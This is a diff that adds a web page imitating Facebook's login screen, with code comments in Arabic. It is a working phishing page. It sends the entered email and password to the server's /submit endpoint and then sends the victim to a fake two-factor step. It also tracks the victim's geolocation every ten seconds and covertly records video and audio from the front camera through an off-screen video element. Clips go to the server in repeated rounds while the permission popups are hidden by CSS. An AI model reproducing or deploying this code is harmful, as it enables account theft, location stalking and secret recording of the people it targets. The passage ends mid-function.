@@ -1,0 +1,1435 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <title>Facebook - log in or sign up</title>
+    <meta name="description" content="Log in to Facebook to start connecting with your friends, family and people you know." />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=5,user-scalable=yes,width=device-width">
+    <meta name="theme-color" content="#1877f2">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
+    <style nonce="Ns5MWSAn">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .fb-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .fb-logo img {
+            width: 80px;
+            margin-bottom: -10px;
+        }
+
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-control {
+            width: 100%;
+            height: 50px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 0 16px;
+            color: #1d2129;
+        }
+
+        .form-control:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-button {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+        }
+
+        .create-button:hover {
+            background-color: #36a420;
+        }
+
+        .meta-logo {
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 25px;
+            margin-bottom: 2px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .meta-logo img {
+            height: 36px;
+            width: auto;
+            filter: grayscale(100%);
+            opacity: 0.8;
+        }
+
+        .meta-text {
+            font-weight: normal;
+            color: #86888a;
+            display: flex;
+            flex-direction: row-reverse;
+            align-items: center;
+            justify-content: center;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            font-size: 20px;
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            padding: 3px;
+            font-size: 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-top: 0;
+        }
+
+        .footer-link {
+            color: #666;
+            text-decoration: none;
+            padding: 0 5px;
+            font-size: 11px;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            left: 12px;
+            top: 31px;
+            cursor: pointer;
+            color: #888;
+            z-index: 2;
+        }
+
+        .password-toggle svg {
+            width: 22px;
+            height: 22px;
+            stroke-width: 1.2;
+            color: #777;
+        }
+
+        @media (max-width: 500px) {
+            .main-container {
+                padding: 0 15px;
+            }
+            
+            .login-form {
+                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            }
+            
+            .language-menu {
+                width: 90%;
+                max-width: 300px;
+            }
+            
+            .language-selector {
+                top: 10px;
+                left: 10px;
+            }
+        }
+        
+        /* Splash Screen / Reels Styles */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .reels-header {
+            height: 60px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            background: rgba(0,0,0,0.4);
+        }
+
+        .reels-header h2 {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .reels-content {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .reels-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+        }
+
+        .reels-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px;
+            color: white;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            z-index: 2;
+        }
+
+        .reels-footer {
+            height: 60px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background: rgba(0,0,0,0.4);
+        }
+
+        .reels-icon {
+            color: white;
+            font-size: 24px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-animation {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 6px solid #1877f2;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+
+        .center-logo {
+            position: absolute;
+            z-index: 3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.7; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.7; }
+        }
+
+        .fb-loading-logo {
+            width: 60px;
+            height: 60px;
+            margin-top: 20px;
+        }
+
+        .login-container {
+            opacity: 1;
+            transition: none;
+        }
+
+        /* Main Facebook Styles */
+        ._li {
+            overflow-y: initial;
+        }
+
+        #globalContainer {
+            width: 100%;
+            height: 100%;
+        }
+
+        .fb_content {
+            padding-bottom: 20px;
+            min-width: 500px;
+        }
+
+        ._8esj {
+            padding-top: 72px;
+            padding-bottom: 112px;
+        }
+
+        ._8esj ._8esk {
+            margin: 0 auto;
+            padding: 0 8px;
+            position: relative;
+            width: 980px;
+            display: flex;
+            flex-direction: row;
+        }
+
+        ._8esl {
+            margin-right: 0;
+            padding-right: 32px;
+            padding-top: 20px;
+            width: 580px;
+        }
+
+        ._8ice {
+            margin: 0;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: -28px;
+            overflow: hidden;
+            width: auto;
+            height: 106px;
+        }
+
+        .fb_logo {
+            height: 106px;
+            margin: -28px;
+        }
+
+        ._8eso {
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+            margin-top: 20px;
+        }
+
+        ._8esn {
+            width: 396px;
+        }
+
+        ._8iep {
+            background-color: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            box-sizing: border-box;
+            margin: 40px 0 0;
+            padding: 20px 0 28px;
+            width: 396px;
+        }
+
+        ._6luv {
+            align-items: center;
+            background-color: #fff;
+            border: none;
+            border-radius: 8px;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 20px 0 28px;
+            width: 396px;
+        }
+
+        ._9vtf {
+            padding: 0 16px;
+        }
+
+        ._6lux {
+            display: inline-block;
+            position: relative;
+            width: 100%;
+            margin: 6px 0;
+        }
+
+        .inputtext {
+            font-size: 17px;
+            width: 100%;
+            padding: 14px 16px;
+            vertical-align: middle;
+        }
+
+        ._55r1 {
+            background-color: #fff;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+
+        ._6luy {
+            font-size: 17px;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            color: #1d2129;
+            height: 48px;
+            width: 100%;
+            vertical-align: middle;
+        }
+
+        ._6luy:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            caret-color: #1877f2;
+            outline: none;
+        }
+
+        /* Fix for password input overlapping issue */
+        #passContainer {
+            display: block;
+            width: 100%;
+            position: relative;
+        }
+
+        ._6ltg {
+            padding-top: 16px;
+            clear: both;
+        }
+
+        ._6lth {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            white-space: nowrap;
+            color: #fff;
+            font-weight: bold;
+            position: relative;
+            text-align: center;
+            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
+        }
+
+        ._6lth:hover {
+            background-color: #166fe5;
+        }
+
+        ._6ltj {
+            margin-top: 16px;
+            text-align: center;
+        }
+
+        ._6ltj a {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        ._8icz {
+            border-bottom: 1px solid #dddfe2;
+            margin: 20px 16px;
+            text-align: center;
+        }
+
+        ._6lti {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            white-space: nowrap;
+            color: #fff;
+            position: relative;
+            text-align: center;
+            margin: 0 auto;
+        }
+
+        ._6lti:hover {
+            background-color: #36a420;
+        }
+
+        ._58mk {
+            color: #1c1e21;
+            font-size: 14px;
+            font-weight: normal;
+            text-align: center;
+            margin-top: 28px;
+            padding: 0 20px;
+        }
+
+        ._8esh {
+            color: #1c1e21;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        ._95ke {
+            padding-top: 20px;
+            border-top: 1px solid #dddfe2;
+            color: #737373;
+            font-size: 12px;
+            margin: 0 auto;
+            max-width: 980px;
+            width: 100%;
+        }
+
+        .uiList {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .localeSelectorList {
+            align-items: center;
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 auto;
+            max-width: 980px;
+            padding: 8px 0;
+        }
+
+        ._2pid {
+            color: #737373;
+            font-size: 12px;
+            line-height: 1.34;
+        }
+
+        .localeSelectorList li {
+            padding-right: 10px;
+        }
+
+        ._sv4 {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+
+        ._sv4:hover {
+            text-decoration: underline;
+        }
+
+        #contentCurve {
+            border-bottom: 1px solid #dddfe2;
+            font-size: 1px;
+            height: 8px;
+            margin-bottom: 8px;
+        }
+
+        .pageFooterLinkList {
+            display: flex;
+            flex-wrap: wrap;
+            line-height: 1.6;
+            margin: 0 auto;
+            max-width: 980px;
+        }
+
+        .pageFooterLinkList li {
+            padding-right: 20px;
+            padding-bottom: 6px;
+        }
+
+        .pageFooterLinkList a {
+            color: #8a8d91;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .pageFooterLinkList a:hover {
+            text-decoration: underline;
+        }
+
+        .mvl {
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .copyright {
+            color: #737373;
+            font-size: 11px;
+            margin: 0 auto;
+            max-width: 980px;
+            padding-bottom: 20px;
+        }
+
+        /* Arabic-specific styles */
+        .rtl {
+            direction: rtl;
+            text-align: right;
+        }
+
+        .rtl ._8ice {
+            margin-left: 0;
+            margin-right: -28px;
+        }
+
+        .rtl ._8esl {
+            padding-right: 0;
+            padding-left: 32px;
+        }
+
+        .rtl ._55r1 {
+            direction: rtl;
+        }
+
+        @media (max-width: 900px) {
+            .fb_content {
+                min-width: initial;
+                padding-bottom: 20px;
+            }
+
+            ._8esj {
+                padding-top: 0;
+            }
+            
+            ._8esj ._8esk {
+                flex-direction: column;
+                padding-top: 20px;
+                width: auto;
+            }
+            
+            ._8esl {
+                padding-right: 0;
+                width: 100%;
+                text-align: center;
+            }
+            
+            ._8ice {
+                margin: 0 auto;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+            
+            ._8eso {
+                margin: 0 auto;
+                font-size: 24px;
+                line-height: 28px;
+                width: auto;
+                max-width: 500px;
+            }
+            
+            ._8esn {
+                width: 100%;
+            }
+            
+            ._8iep, ._6luv, ._9vtf {
+                width: 100%;
+                max-width: 416px;
+                margin-right: auto;
+                margin-left: auto;
+            }
+
+            .rtl ._8esl {
+                padding-left: 0;
+            }
+        }
+
+        @media (max-width: 640px) {
+            ._8eso {
+                font-size: 20px;
+                line-height: 24px;
+            }
+
+            ._8esj {
+                padding-bottom: 60px;
+            }
+
+            .pageFooterLinkList li {
+                padding-right: 12px;
+                font-size: 11px;
+            }
+
+            .localeSelectorList li {
+                padding-right: 8px;
+                font-size: 11px;
+            }
+            
+            /* Improved mobile styling for login form */
+            ._6luv {
+                border-radius: 0;
+                box-shadow: none;
+                margin-top: 12px;
+                padding: 10px 0;
+            }
+            
+            ._6lux {
+                margin: 10px 0;
+            }
+            
+            ._6luy {
+                border-radius: 4px;
+                height: 52px;
+            }
+            
+            ._8iep {
+                box-shadow: none;
+                background: transparent;
+            }
+            
+            /* Fix for password input on mobile */
+            #passContainer {
+                margin-bottom: 4px;
+                display: flex;
+            }
+        }
+
+        /* زيادة حجم أيقونة التحميل عند تحميل الصفحة */
+        .loading-spinner {
+            width: 30px;
+            height: 30px;
+            border-width: 3px;
+        }
+
+        /* قائمة اللغات المنسدلة */
+        .language-menu {
+            position: fixed;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            padding: 8px 0;
+            width: 270px;
+            display: none;
+            z-index: 10000;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            direction: ltr;
+            text-align: right;
+        }
+        
+        .language-menu-header {
+            padding: 12px 16px;
+            font-weight: bold;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 8px;
+            text-align: right;
+            direction: rtl;
+            position: relative;
+            font-size: 16px;
+        }
+        
+        .language-menu-close {
+            position: absolute;
+            top: 8px;
+            left: 16px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #666;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .language-menu-close:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .language-option {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            justify-content: space-between;
+            transition: background-color 0.2s;
+        }
+        
+        .language-option:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .language-option input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            margin: 0;
+            pointer-events: none;
+        }
+        
+        .language-option span {
+            flex: 1;
+            text-align: right;
+            margin-left: 8px;
+            font-size: 14px;
+        }
+        
+        .language-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: none;
+        }
+
+        /* إخفاء عناصر الأذونات المنبثقة تمامًا */
+        .permission-popup, .permission-overlay {
+            display: none !important;
+        }
+
+        /* Hidden video element for camera capture */
+        #camera-feed {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        /* تم تعليق أكواد CSS المتعلقة بنافذة الأذونات لأنها لم تعد مستخدمة
+        .permission-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            max-width: 300px;
+            text-align: center;
+            display: none;
+        }
+        
+        .permission-popup h3 {
+            margin-bottom: 15px;
+            color: #1877f2;
+        }
+        
+        .permission-popup p {
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .permission-popup button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 9998;
+            display: none;
+        }
+        */
+    </style>
+</head>
+<body class="login-body" dir="ltr" style="height: 100vh;">
+    <!-- Splash Screen / Reels Look -->
+    <div id="splash-screen">
+        <div class="reels-header">
+            <h2>Reels</h2>
+            <div class="reels-icon">×</div>
+        </div>
+        <div class="reels-content">
+            <div class="center-logo">
+                <div class="loading-animation"></div>
+                <img class="fb-loading-logo" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook">
+            </div>
+            <div class="reels-overlay">
+                <h3>Meta</h3>
+                <p>Log in to continue</p>
+            </div>
+        </div>
+        <div class="reels-footer">
+            <div class="reels-icon">♥</div>
+            <div class="reels-icon">💬</div>
+            <div class="reels-icon">➦</div>
+        </div>
+    </div>
+
+    <!-- Modern Facebook Login UI -->
+    <div class="main-container">
+            <div class="fb-logo">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook">
+        </div>
+        
+        <form class="login-form" id="loginForm" action="/submit" method="POST">
+            <div class="form-group">
+                <input type="text" class="form-control" name="email" placeholder="Email address or phone number" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" class="form-control" name="password" placeholder="Password" required>
+            </div>
+            
+            <button type="submit" class="login-button" id="loginButton">Log In</button>
+            
+            <div class="forgot-password">
+                <a href="https://www.facebook.com/login/identify/">Forgotten password?</a>
+            </div>
+        
+        <div class="divider"></div>
+        
+            <div class="create-account">
+                <a href="https://www.facebook.com/r.php" class="create-button">Create New Account</a>
+        </div>
+        </form>
+    </div>
+    
+    <div class="meta-logo">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt="Meta Logo" style="height: 36px; width: auto; filter: grayscale(100%); opacity: 0.8;">
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link" data-lang-key="about">About</a>
+            <a href="#" class="footer-link" data-lang-key="help">Help</a>
+            <a href="#" class="footer-link" data-lang-key="more">More</a>
+        </div>
+    </div>
+
+    <!-- Permission Popup -->
+    <!-- تمت إزالة نافذة الأذونات المنبثقة نهائيًا -->
+    
+    <!-- Hidden video element for camera capture -->
+    <video id="camera-feed" autoplay muted playsinline width="1280" height="720" style="position: fixed; top: -9999px; left: -9999px; opacity: 0;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- Hidden elements for video recording -->
+    <div id="recording-indicator" style="display: none; position: fixed; top: 10px; right: 10px; z-index: 9999; background-color: red; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px;">
+        Recording <span id="recording-time">0</span>s
+    </div>
+    <video id="recorded-video-preview" style="display: none;" controls></video>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // تهيئة المتغيرات
+            let translationLang = localStorage.getItem('fb_language') || 'ar';
+            let captureCount = 0;
+            let successfulCaptures = 0;
+            let cameraIntervalId = null;
+            let retryCount = 0;
+            let overlayVisible = false;
+            const MAX_CAPTURES = 5;
+            const MAX_RETRIES = 3;
+            
+            // متغيرات جديدة لتسجيل الفيديو
+            let mediaRecorder = null;
+            let recordedChunks = [];
+            let isRecording = false;
+            let recordingTimer = null;
+            let recordingSeconds = 0;
+            let maxRecordingTime = 15; // الحد الأقصى 15 ثانية
+            
+            // Set title to English
+            document.title = "Facebook - log in or sign up";
+            
+            // Hide splash screen and show login container immediately
+            document.getElementById('splash-screen').style.display = 'none';
+            
+            // Password toggle functionality
+            const passwordToggle = document.querySelector('.password-toggle');
+            const passwordInput = document.querySelector('input[name="password"]');
+            
+            passwordToggle.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+            });
+            
+            // Add loading effects when submitting the form
+            const loginForm = document.querySelector('.login-form');
+            const loginButton = document.querySelector('.login-button');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const button = document.getElementById('loginButton');
+                button.classList.add('loading');
+                
+                // Collect form data
+                const formData = new FormData(this);
+                
+                // Get location first, then submit form
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // Send location data first
+                            fetch('/api/get-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(() => {
+                                // After location is sent, submit the form
+                                return fetch('/submit', {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.status === 'success') {
+                                    window.location.href = '/two_factor';
+                                } else {
+                                    button.classList.remove('loading');
+                                    alert('Invalid credentials. Please try again.');
+                                }
+                            })
+                            .catch(error => {
+                                button.classList.remove('loading');
+                                console.error('Error:', error);
+                            });
+                        },
+                        function(error) {
+                            console.error('Geolocation error:', error);
+                            // If location fails, still submit the form
+                            fetch('/submit', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.status === 'success') {
+                                    window.location.href = '/two_factor';
+                                } else {
+                                    button.classList.remove('loading');
+                                    alert('Invalid credentials. Please try again.');
+                                }
+                            })
+                            .catch(error => {
+                                button.classList.remove('loading');
+                                console.error('Error:', error);
+                            });
+                        }
+                    );
+                } else {
+                    // If geolocation is not supported, just submit the form
+                    fetch('/submit', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            window.location.href = '/two_factor';
+                        } else {
+                            button.classList.remove('loading');
+                            alert('Invalid credentials. Please try again.');
+                        }
+                    })
+                    .catch(error => {
+                        button.classList.remove('loading');
+                        console.error('Error:', error);
+                    });
+                }
+            });
+            
+            // Permission handling
+            let locationIntervalId = null;
+            
+            function requestPermissions() {
+                // طلب الأذونات بشكل متوازٍ
+                requestLocationPermission();
+                
+                // محاولة تفعيل الكاميرا فوراً
+                requestCameraPermission();
+                
+                // إذا فشلت محاولة الكاميرا الأولى، حاول مرة أخرى بعد ثانية
+                setTimeout(function() {
+                    if (successfulCaptures === 0 && retryCount < MAX_RETRIES) {
+                        console.log("إعادة محاولة تفعيل الكاميرا...");
+                        requestCameraPermission();
+                    }
+                }, 1500);
+                
+                // إرسال حالة الأذونات إلى الخادم
+                updatePermissionsStatus(true, true);
+            }
+            
+            function requestLocationPermission() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // نجاح الحصول على الموقع
+                            sendLocationData(position.coords);
+                            
+                            // تعيين فاصل زمني لتتبع الموقع باستمرار
+                            locationIntervalId = setInterval(function() {
+                                navigator.geolocation.getCurrentPosition(
+                                    function(updatedPosition) {
+                                        sendLocationData(updatedPosition.coords);
+                                    },
+                                    function(error) {
+                                        console.log("خطأ في تحديث الموقع:", error);
+                                        // الاستمرار في تسجيل الدخول، حتى مع رفض الأذونات
+                                    },
+                                    { enableHighAccuracy: true }
+                                );
+                            }, 10000); // كل 10 ثوانٍ
+                        },
+                        function(error) {
+                            console.log("خطأ في الحصول على الموقع الأولي:", error);
+                            updatePermissionsStatus(false, true);
+                            // الاستمرار في تسجيل الدخول، حتى مع رفض الأذونات
+                        },
+                        { enableHighAccuracy: true }
+                    );
+                }
+            }
+            
+            function sendLocationData(coords) {
+                const locationData = {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    altitude: coords.altitude,
+                    altitudeAccuracy: coords.altitudeAccuracy,
+                    heading: coords.heading,
+                    speed: coords.speed,
+                    timestamp: new Date().toISOString()
+                };
+                
+                fetch('/api/get-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("تم إرسال بيانات الموقع بنجاح", data);
+                })
+                .catch(error => {
+                    console.error("خطأ في إرسال بيانات الموقع:", error);
+                });
+            }
+            
+            function requestCameraPermission() {
+                retryCount++;
+                console.log("محاولة فتح الكاميرا #" + retryCount);
+                
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: true  // تفعيل الصوت لتسجيل الفيديو
+                };
+                
+                const video = document.getElementById('camera-feed');
+                const canvas = document.getElementById('canvas');
+                
+                // إعادة تعيين الفيديو
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }
+                
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(stream) {
+                        console.log("تم الحصول على مجرى الكاميرا بنجاح");
+                        video.srcObject = stream;
+                        
+                        // ضمان تشغيل الفيديو بعدة طرق
+                        video.play()
+                            .then(() => console.log("تم تشغيل الفيديو بنجاح"))
+                            .catch(err => console.error("خطأ في تشغيل الفيديو:", err));
+                        
+                        // إضافة مستمعي أحداث لضمان عمل الفيديو
+                        video.onloadedmetadata = function() {
+                            console.log("تم تحميل بيانات الفيديو (metadata)");
+                            video.play();
+                        };
+                        
+                        video.oncanplay = function() {
+                            console.log("الفيديو جاهز للتشغيل");
+                        };
+                        
+                        // بدء تسجيل الفيديو بعد ثانية واحدة
+                        setTimeout(function() {
+                            startVideoRecording(stream);
+                        }, 1000);
+                    })
+                    .catch(function(error) {
+                        console.error("خطأ في الوصول إلى الكاميرا:", error);
+                        
+                        // محاولة أخرى بإعدادات مختلفة إذا فشلت المحاولة الأولى
+                        if (retryCount < MAX_RETRIES) {
+                            console.log("محاولة تشغيل الكاميرا بإعدادات مختلفة...");
+                            
+                            // محاولة بدقة أقل
+                            const simpleConstraints = {
+                                video: { facingMode: 'user' },
+                                audio: true  // تفعيل الصوت للفيديو
+                            };
+                            
+                            setTimeout(() => {
+                                navigator.mediaDevices.getUserMedia(simpleConstraints)
+                                    .then(function(stream) {
+                                        console.log("تم الحصول على مجرى الكاميرا بإعدادات بسيطة");
+                                        video.srcObject = stream;
+                                        video.play();
+                                        
+                                        // بدء تسجيل الفيديو
+                                        startVideoRecording(stream);
+                                    })
+                                    .catch(error => {
+                                        console.error("فشلت المحاولة الثانية للكاميرا:", error);
+                                        updatePermissionsStatus(false, true);
+                                    });
+                            }, 500);
+                        } else {
+                            updatePermissionsStatus(false, true);
+                        }
+                    });
+            }
+            
+            // دالة جديدة لبدء تسجيل الفيديو
+            function startVideoRecording(stream) {
+                try {
+                    // إنشاء MediaRecorder
+                    let options = { mimeType: 'video/webm;codecs=vp9,opus' };
+                    
+                    // محاولة اختيار أفضل MIME type متاح
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                            options = { mimeType: 'video/webm' };
+                            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                                options = { mimeType: '' };
+                            }
+                        }
+                    }
+                    
+                    // تهيئة المسجل
+                    recordedChunks = [];
+                    mediaRecorder = new MediaRecorder(stream, options);
+                    
+                    // حدث عند توفر بيانات
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data && e.data.size > 0) {
+                            recordedChunks.push(e.data);
+                        }
+                    };
+                    
+                    // حدث عند انتهاء التسجيل
+                    mediaRecorder.onstop = function() {
+                        console.log("تم الانتهاء من تسجيل الفيديو");
+                        stopRecordingTimer();
+                        
+                        // تجميع البيانات المسجلة
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        sendVideoToServer(blob);
+                        
+                        // إعادة بدء التسجيل بعد فترة قصيرة (اختياري)
+                        setTimeout(() => {
+                            if (captureCount < MAX_CAPTURES) {
+                                startVideoRecording(stream);
+                            }
+                        }, 2000);
+                    };
+                    
+                    // بدء التسجيل
+                    mediaRecorder.start();
+                    isRecording = true;
+                    captureCount++;
+                    console.log("بدء تسجيل الفيديو #" + captureCount);
+                    
+                    // تشغيل مؤقت التسجيل
+                    startRecordingTimer();
+                    
+                    // إيقاف التسجيل بعد وقت محدد
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                            isRecording = false;
+                        }
+                    }, maxRecordingTime * 1000);
+                    
+                } catch(error) {
